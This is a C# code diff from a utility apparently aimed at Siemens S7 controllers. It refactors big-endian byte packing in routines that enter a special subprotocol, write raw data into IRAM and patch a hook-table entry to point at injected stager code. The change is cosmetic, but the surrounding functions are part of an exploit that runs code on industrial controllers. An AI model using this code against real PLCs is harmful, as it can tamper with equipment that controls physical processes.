@@ -184,7 +184,8 @@ namespace S7_Csharp_Utility
         {
             _log($"Entering subprotocol mode {mode}...");
             ushort magic = SUBPROT_80_MODE_MAGICS[mode];
-            byte[] payload = { (byte)(magic >> 8), (byte)magic };
+            byte[] payload = BitConverter.GetBytes(magic);
+            if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
             var response = await InvokePrimaryHandler(0x80, payload);
             if (!response.SequenceEqual(ANSW_ENTER_SUBPROTO_SUCCESS))
                 throw new Exception("Failed to enter subprotocol.");
@@ -204,10 +205,9 @@ namespace S7_Csharp_Utility
             payload[0] = 0x84;
             payload[1] = 0x5a;
             payload[2] = 0x2e;
-            payload[3] = (byte)(address >> 24);
-            payload[4] = (byte)(address >> 16);
-            payload[5] = (byte)(address >> 8);
-            payload[6] = (byte)address;
+            var addrBytes = BitConverter.GetBytes(address);
+            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes); // Ensure big-endian
+            Array.Copy(addrBytes, 0, payload, 3, 4);
             Array.Copy(data, 0, payload, 7, data.Length);
 
             await SendPacketAsync(payload);
@@ -254,11 +254,10 @@ namespace S7_Csharp_Utility
             hookEntryPayload[0] = 0x00; // Arg length check part 1
             hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)
 
-            // Pointer to the stager code
-            hookEntryPayload[2] = (byte)(IRAM_STAGER_START >> 24);
-            hookEntryPayload[3] = (byte)(IRAM_STAGER_START >> 16);
-            hookEntryPayload[4] = (byte)(IRAM_STAGER_START >> 8);
-            hookEntryPayload[5] = (byte)IRAM_STAGER_START;
+            // Pointer to the stager code (big-endian)
+            var addrBytes = BitConverter.GetBytes(IRAM_STAGER_START);
+            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes);
+            Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);
 
             await WriteToIram(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
             _log("Stager installation complete.");
